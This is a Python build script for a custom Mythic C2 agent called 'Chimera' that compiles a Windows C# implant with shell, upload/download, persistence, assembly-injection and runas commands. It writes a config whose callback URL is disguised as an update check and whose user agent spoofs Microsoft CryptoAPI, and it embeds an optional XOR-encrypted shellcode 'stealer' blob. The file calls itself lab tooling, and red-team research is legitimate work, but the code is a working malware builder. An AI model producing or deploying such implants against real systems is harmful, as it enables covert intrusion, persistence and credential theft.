from mythic_container.MythicCommandBase import *
from mythic_container.PayloadBuilder import *
from agent_functions import shell, upload, download, ls, pwd, cd, sleep, kill, persist, inject_assembly, runas_exec, help
import os, subprocess, shutil

class Chimera(PayloadType):
    name = "chimera"
    file_extension = "exe"
    author = "lab"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = "Custom C# Mythic agent for lab use"
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = True
    translation_container = None
    build_parameters = [
        BuildParameter(
            name="version",
            parameter_type=BuildParameterType.String,
            description="Agent version",
            default_value="1.0",
            required=False,
        )
    ]
    agent_path      = Path(".") / "chimera"
    agent_code_path = Path(".") / "agent_code"
    agent_icon_path = agent_path / "chimera.svg"

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        try:
            build_dir = "/tmp/chimera_build"
            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)
            shutil.copytree(str(self.agent_code_path), build_dir)

            c2     = self.c2info[0]
            params = c2.get_parameters_dict()
            callback_host     = params.get("callback_host", "http://localhost")
            callback_port     = params.get("callback_port", 80)
            callback_interval = params.get("callback_interval", 10)

            config_content = f"""namespace Chimera {{
    public static class Config {{
        public static string CallbackURL   = "{callback_host}:{callback_port}/api/v1/update/check";
        public static int    SleepInterval = {callback_interval};
        public static int    Jitter        = 30;
        public static string UserAgent     = "Microsoft-CryptoAPI/10.0";
        public static string PayloadUUID   = "{self.uuid}";
    }}
}}"""
            with open(f"{build_dir}/Config.cs", "w") as f:
                f.write(config_content)

            # stealer_enc: optional XOR-encrypted shellcode blob for run_stealer command.
            # Place the file at agent_code/stealer_enc before building if you want it embedded.
            # If it doesn't exist, the binary builds fine but run_stealer will report "not found".
            stealer_enc_path = f"{build_dir}/stealer_enc"
            res_flag = []
            if os.path.exists(stealer_enc_path):
                res_flag = [f"/res:{stealer_enc_path},stealer_enc"]

            mcs_cmd = [
                "mcs",
                "-target:winexe",
                "-platform:x86",
                "-out:/tmp/chimera.exe",
                "-r:System.Net.Http.dll",
                f"{build_dir}/Program.cs",
                f"{build_dir}/Config.cs",
                f"{build_dir}/C2Http.cs",
                f"{build_dir}/Tasking.cs",
                f"{build_dir}/StringHelper.cs",
                f"{build_dir}/Commands/Shell.cs",
                f"{build_dir}/Commands/Upload.cs",
                f"{build_dir}/Commands/Download.cs",
                f"{build_dir}/Commands/Ls.cs",
                f"{build_dir}/Commands/Pwd.cs",
                f"{build_dir}/Commands/Cd.cs",
                f"{build_dir}/Commands/Sleep.cs",
                f"{build_dir}/Commands/Kill.cs",
                f"{build_dir}/Commands/Help.cs",
                f"{build_dir}/Commands/Persist.cs",
                f"{build_dir}/Commands/InjectAssembly.cs",
                f"{build_dir}/Commands/RunasExec.cs",
            ] + res_flag

            result = subprocess.run(
                mcs_cmd,
                capture_output=True,
                text=True
            )

            if result.returncode != 0:
                resp.status = BuildStatus.Error
                resp.error_message = result.stderr
                return resp

            with open("/tmp/chimera.exe", "rb") as f:
                resp.payload = f.read()

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.error_message = str(e)

        return resp
